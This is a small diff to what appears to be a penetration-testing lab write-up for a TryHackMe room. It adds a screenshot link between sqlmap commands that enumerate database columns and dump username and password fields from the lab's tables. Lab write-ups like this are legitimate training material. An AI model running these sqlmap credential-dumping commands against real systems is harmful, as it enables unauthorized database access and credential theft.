@@ -20,6 +20,7 @@ sqlmap -r request.txt --batch -D THM_f0und_m3 -T user --columns
 sqlmap -r request.txt --batch -D THM_f0und_m3 -T user -C username,password --sql-query "select username,password from user"
 
 ```
+![Screenshot from 2024-05-24 16-10-30](https://github.com/Berlinshaju/penetrationtester/assets/66897078/fd1f7c06-a490-47ef-844e-1c2a4336f420)
 
 ```
 sqlmap -r request.txt --batch -D THM_f0und_m3 -T nothing_inside --columns
